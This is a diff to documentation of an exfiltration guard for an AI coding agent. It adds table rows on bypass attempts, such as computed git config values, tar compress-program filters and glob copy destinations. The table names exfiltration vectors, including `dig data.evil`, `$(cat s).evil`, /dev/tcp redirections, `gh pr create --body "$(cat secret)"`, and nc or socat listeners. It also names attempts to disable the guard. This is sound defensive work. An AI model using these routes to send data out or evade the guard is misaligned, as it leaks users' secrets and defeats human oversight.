@@ -97,16 +97,18 @@ keep working when any of those rules is changed.
 | `git remote set-url` then `git push origin` | set-url blocked; push checks the pinned `host/owner/repo` |
 | Editing `.git/config` with the Write tool, then pushing | push still checks the pin → block |
 | `git -c remote.origin.url=… push`, `git --config-env=remote.origin.url=… push`, `git -C /other push`, `--git-dir`/`--work-tree`, `--receive-pack=` | block |
-| `git -C <dir>` inside this project's work tree | followed like a `cd`; a push from there still faces the pin check. More than one `-C` blocks, as does a `-C` the shell expands (`$DIR`, `~/x`) and a `-C` that selects a separate repository nested inside the work tree |
+| `git -c "$C" push` / `git --config-env "$C" push` (the value the shell computes) | block — a computed config value cannot be matched against the sensitive-key list, so git could rewrite the remote while the guard checked the on-disk origin |
+| `git -C <dir>` inside this project's work tree | followed like a `cd`; a push from there still faces the pin check. More than one `-C` blocks, as does a `-C` the shell expands (`$DIR`, `~/x`, a glob or brace list) and a `-C` that selects a separate repository nested inside the work tree — a nested work tree or a bare repo alike, compared by the git directory git actually selects |
 | `cd /other/clone && git push origin` | effective directory tracked; pin check applies there |
 | `gh api -f`, `gh gist`, `gh release upload`, `gh pr create --body-file` | block |
 | `gh pr create --body "$(cat secret)"` | substitution on a `gh` line → block |
 | DNS exfiltration (`dig data.evil`, `$(cat s).evil`) | probe tools need a lab host; substitution blocks |
 | `/dev/tcp` bash redirections | regex on the raw text |
 | `cp`/`mv`/`rsync`/`tee`/`dd`/`tar`/`zip`/`ln`/`install`/`ditto` writing into iCloud/Dropbox/OneDrive/`/Volumes` | block — the destination operand (`-t`, `of=`, `tar -C` when extracting, `tar -f` when creating, the zip archive) is what is checked; so are `zip -b`/`--temp-path` (the temporary archive's directory) |
-| A copy destination the shell computes (`cp f "$DEST"`, `mv f "$(…)"`) | block — a computed path cannot be checked; a computed source is allowed |
+| `tar --use-compress-program=…`/`-I …`/`--to-command=…` | block — tar runs the named program as a filter, which can stream the archive to another host while the only operand checked is the local archive |
+| A copy destination the shell computes — a parameter/command substitution (`cp f "$DEST"`, `mv f "$(…)"`) or a glob/brace expansion (`cp secret /V*`, `mv a /Volumes/{x,y}`) | block — a path the shell rewrites at run time cannot be checked; a computed source is allowed |
 | Reading from such a folder (`cp /Volumes/USB/f .`, `cat`, `dd if=`, `tar -cf out.tar /Volumes/…`) | allowed; only a write into one is an upload |
-| A copy tool option the guard does not recognize, or `unzip`/`gzip`/`bzip2`/`xz` | destination cannot be identified → any synced/volume path among the arguments blocks |
+| A copy tool option the guard does not recognize, or `unzip`/`gzip`/`bzip2`/`xz` | destination cannot be identified → every argument is a possible destination, so any synced/volume path, computed path, or glob/brace among the arguments blocks |
 | `python -m http.server`, `nc -l`, `socat …-LISTEN`, `php -S` | serving is exposing → block |
 | Editing the allowlist during the session | the allowlist is read from `HEAD`, never the working tree — the edit has no effect until a human commits it |
 | Deleting, unregistering or editing the guard | `guard-enforcement-files.sh` announces the edit; `verify-exfiltration-guard.sh` fails CI when a guard file is missing from `HEAD`, when the registration no longer covers `Artifact`, `SendUserFile` and `Bash`, or when either changed between the merge base with the base branch and HEAD |
